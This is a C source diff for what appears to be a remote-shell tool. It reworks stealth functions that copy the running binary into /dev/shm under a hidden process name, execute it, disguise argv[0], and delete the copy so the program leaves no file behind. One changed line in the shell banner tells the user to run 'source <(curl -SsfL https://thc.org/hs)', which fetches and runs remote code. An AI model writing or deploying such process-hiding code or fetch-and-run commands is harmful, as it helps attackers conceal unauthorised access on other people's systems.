@@ -71,29 +71,24 @@ add_env_argv(int *argcptr, char **argvptr[])
 
 // Copy myself into /dev/shm and try to execute myself.
 static int
-try_cpexecme(char *argv[]) {
+try_cpexecme(char *exename, char *argv[]) {
 	int ret = -1;
 	int src = -1, dst = -1;
 
-	if (!(gopt.flags & GSC_FL_CPEXECME))
-		return -1; // continue
-
-	if (getenv("_GS_NOCPEXECME") != NULL) {
-		gopt.flags |= GSC_FL_DELME; // implied 
-		goto ok;
-	}
+	// if (!(gopt.flags & GSC_FL_CPEXECME))
+	// 	return -1; // continue
 
 	if (gopt.proc_hiddenname == NULL)
 		return -1;
 
-	setenv("_GS_NOCPEXECME", "1", 1);
-
 	char fn[512];
 	char buf[4096];
 	ssize_t sz;
-	if ((src = open(gopt.prg_exename, O_RDONLY | O_CLOEXEC)) < 0)
+	if ((src = open(exename, O_RDONLY | O_CLOEXEC)) < 0)
 		goto err;
 	snprintf(fn, sizeof fn, "/dev/shm/%s", gopt.proc_hiddenname);
+	setenv("_GS_DELME", fn, 1);
+	setenv("_GS_PROC_EXENAME", exename, 1);
 	if ((dst = open(fn, O_WRONLY | O_CREAT | O_CLOEXEC, S_IRWXU)) < 0)
 		goto err;
 
@@ -106,16 +101,20 @@ try_cpexecme(char *argv[]) {
 	}
 
 	argv[0] = gopt.proc_hiddenname;
+
+	XCLOSE(dst);
 	execv(fn, argv);
+	// HERE: ERROR: execv() failed.
 	unlink(fn);
+
 	goto err;
-ok:
 	ret = 0;
 err:
 	XCLOSE(src);
 	XCLOSE(dst);
 	gopt.flags &= ~GSC_FL_CPEXECME;
-	unsetenv("_GS_NOCPEXECME");
+	unsetenv("_GS_DELME");
+	unsetenv("_GS_PROC_EXENAME");
 	return ret;
 }
 
@@ -149,7 +148,11 @@ try_changeargv0(char *argv[]) {
 		DEBUGF("Now hidden as ARGV0=%s [EXENAME=%s]\n", argv[0], gopt.prg_exename);
 		unsetenv("_GS_PROC_EXENAME");
 		GSNC_config_read(gopt.prg_exename);
-		gopt.flags &= ~(GSC_FL_CHANGE_CGROUP | GSC_FL_CPEXECME);
+		gopt.flags &= ~(GSC_FL_CPEXECME);
+		if ((ptr = getenv("_GS_DELME"))) {
+			unlink(ptr);
+			unsetenv("_GS_DELME");
+		}
 		return;
 	}
 
@@ -172,10 +175,11 @@ try_changeargv0(char *argv[]) {
 		return;
 	}
 
-	if (try_cpexecme(argv) == 0)
+	// First try to copy & execute myself as /dev/shm/PROC_HIDDENNAME
+	if (try_cpexecme(exename, argv) == 0)
 		return;
 
-	// HERE: Switch to argv0 to different name.
+	// Otherwise, modify my argv[0]
 	setenv("_GS_PROC_EXENAME", exename, 1);
 	argv[0] = gopt.proc_hiddenname;
 	execv(exename, argv);
@@ -1314,7 +1318,7 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	printf("\
 =Tip            : Press "CDM"Ctrl-e c"CN" for elite console\n\
 =Tip            : "CDC"PS1='%s'"CN"\n\
-=TIP            : "CDC"export LANG=C.UTF-8;locale -a 2>/dev/null|grep -Fqim1 C.UTF-8||export LANG=C"CN, str);
+=Tip            : "CDC"source <(curl -SsfL https://thc.org/hs)"CN"\n", str);
 	if (GS_getenv("PS1") == NULL) {
 		// Note: This only works for /bin/sh because some bash reset this value.
 		envp[envplen++] = strdup(buf);
@@ -1357,7 +1361,11 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	envp[envplen++] = "LANG=en_US.UTF-8";
 	envp[envplen++] = "GS_CONFIG_READ=0";
 	if (gopt.prg_exename != NULL) {
-		snprintf(buf, sizeof buf, "GS=%s", gopt.prg_exename);
+		struct stat sb;
+		if (stat(gopt.prg_exename, &sb) != 0) {
+			printf("="CDR"WARNING"CN"        : GSNC has been removed: "CDY"%s"CN"\n", gopt.prg_exename);
+		}
+		snprintf(buf, sizeof buf, "GSNC=%s", gopt.prg_exename);
 		envp[envplen++] = strdup(buf);
 	}
 
